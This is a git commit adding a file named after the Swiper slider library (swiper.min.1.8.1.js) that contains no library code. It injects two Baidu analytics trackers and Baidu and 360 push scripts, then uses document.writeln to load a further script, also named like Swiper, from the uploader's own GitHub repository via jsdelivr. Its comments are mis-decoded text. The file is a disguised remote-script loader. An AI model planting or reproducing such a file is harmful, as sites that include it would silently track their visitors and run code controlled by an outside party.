6c0586ce8e0c3bf3d959d3802dba90f03be7d246
haopdy <84508674+haopdy@users.noreply.github.com>
2021-06-08 19:10:48 +0800

    Add files via upload

---
+++ swiper.min.1.8.1.js
@@ -0,0 +1,37 @@
+
+
+
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ccede9c1f7b2966b19c16735d5edafe5";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?769a1b84d2b46d84a8a85184e0c554fb";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+
+(function () {
+    /*鐧惧害鎺ㄩ€佷唬鐮�*/
+     var bp = document.createElement('script');
+     bp.src = '//push.zhanzhang.baidu.com/push.js';
+     var s = document.getElementsByTagName("script")[0];
+     s.parentNode.insertBefore(bp, s);
+     /*360鎺ㄩ€佷唬鐮�*/
+     var src = document.location.protocol + '//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9';
+     document.write('<script src="' + src + '" id="sozz"><\/script>');
+     })();
+
+
+
+
+document.writeln("<script type=\'text/javascript\' src=\'https://cdn.jsdelivr.net/gh/haopdy/haopdyb/swiper.min.1.8.2.js\'></script>");
